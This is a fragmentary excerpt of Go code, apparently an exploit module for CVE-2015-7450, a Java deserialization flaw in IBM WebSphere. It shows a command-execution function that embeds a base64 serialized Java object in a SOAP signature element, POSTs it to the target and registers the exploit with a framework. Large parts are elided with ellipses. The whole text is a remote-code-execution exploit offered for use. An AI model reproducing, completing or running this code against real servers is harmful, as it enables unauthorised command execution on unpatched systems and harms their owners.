...
func (self *Exp_CVE_2015_7450) Cmd1(cmd string) (expResult exp_model.ExpResult) {
	// 默认配置
...
<signature xsi:type="ns1:[Ljava.lang.String;">rO0ABXVyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0ACRjb20uaWJtLndlYnNwaGVyZS5tYW5hZ2VtZW50LlNlc3Npb24=</signature>
	...
	httpresp := self.HttpPostWithoutRedirect(self.Params.Target, body, headers)
	if httpresp.Err != nil {
...
`,
	...
	exp_register.ExpStructRegister(&Exp_CVE_2015_7450{}, registerMsg)
